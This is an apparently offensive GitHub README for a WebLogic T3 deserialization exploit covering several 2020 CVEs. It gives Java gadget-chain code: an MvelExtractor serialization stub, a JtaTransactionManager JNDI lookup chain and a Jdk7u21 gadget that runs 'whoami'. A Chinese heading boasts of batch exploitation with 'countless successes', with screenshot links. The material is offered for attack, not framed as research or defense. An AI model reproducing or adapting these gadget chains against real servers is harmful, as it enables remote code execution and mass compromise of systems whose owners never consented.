# Weblogic 1day
CVE_2020_2546 CVE-2020-2915 CVE-2020-2801  CVE-2020-2798  CVE-2020-2883 CVE-2020-2884 CVE-2020-2950 WebLogic T3 payload exploit pot python3

### code n1
```
MVEL.compileExpression
MvelExtractor o = new MvelExtractor("xxx;");
		ObjectOutputStream oo = new ObjectOutputStream(System.out); 
		oo.writeObject(o);
		oo.flush();
```

### code1
```
public MsgOutput getObject(final String command) throws Exception {
	  String jndiAddress = command;
		JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
		jtaTransactionManager.setUserTransactionName(jndiAddress);
		MsgOutput remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), MsgOutput.class);
    return remote;
  }
```

### code2
```
public IORDelegate getObject(final String command) throws Exception {
IORDelegate ior = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", new Jdk7u21().getObject("whoami")), IORDelegate.class);
    return ior;
  }
```

## CVE-2020-2546 payload
#### 批量一波，成功无数
<img width="621" alt="image" src="https://user-images.githubusercontent.com/18223385/75693161-8c550300-5ce1-11ea-9c28-3e81a6c72d28.png">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/18223385/75693276-abec2b80-5ce1-11ea-9e69-9adee78edee7.png">

